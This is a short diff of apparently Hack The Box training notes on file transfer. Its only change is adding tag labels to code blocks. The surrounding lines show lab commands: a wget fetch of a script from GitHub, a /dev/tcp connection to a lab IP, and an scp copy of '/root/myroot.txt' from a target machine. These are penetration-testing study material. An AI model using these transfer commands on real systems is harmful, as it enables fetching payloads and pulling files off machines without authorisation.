@@ -15,6 +15,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 ```
 
 #### Bash
+[[bash]]
 ```shell
 h@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
 
@@ -24,7 +25,8 @@ h@htb[/htb]$ cat <&3
 ```
 
 #### SSH
-```shell-session
+[[ssh]]
+```shell
 h@htb[/htb]$ sudo systemctl start ssh
 
 h@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
